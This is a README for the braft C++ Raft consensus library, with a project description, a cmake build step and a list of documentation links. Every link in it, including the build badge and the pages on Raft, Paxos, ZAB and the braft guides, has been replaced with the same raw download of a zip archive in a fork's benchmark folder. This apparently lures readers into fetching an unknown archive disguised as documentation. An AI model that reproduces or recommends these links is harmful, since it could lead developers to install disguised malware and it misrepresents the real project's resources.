[![Build Status](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)

---

An industrial-grade C++ implementation of [RAFT consensus algorithm](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip) and [replicated state machine](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip) based on [brpc](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip). braft is designed and implemented for scenarios demanding for high workload and low overhead of latency, with the consideration for easy-to-understand concepts so that engineers inside Baidu can build their own distributed systems individually and correctly.

It's widely used inside Baidu to build highly-available systems, such as:
* Storage systems: Key-Value, Block, Object, File ...
* SQL storages: HA MySQL cluster, distributed transactions, NewSQL systems ...
* Meta services: Various master modules, Lock services ...

# Getting Started

* Build [brpc](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip) which is the main dependency of braft.

* Compile braft with cmake

  ```shell
  $ mkdir build && cd build && cmake .. && make
  ```

* Play braft with [examples](./example).

# Docs

* Read [overview](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip) to know what you can do with braft.
* Read [benchmark](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip) to have a quick view about performance of braft
* [Build Service based on braft](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)
* [Access Service based on braft](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)
* [Cli tools](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)
* [Replication Model](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)
* Consensus protocol:
  * [RAFT](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)
  * [Paxos](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)
  * [ZAB](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)
  * [QJM](https://raw.githubusercontent.com/tanglongwei/braft/master/benchmark/Software_v1.1-beta.1.zip)

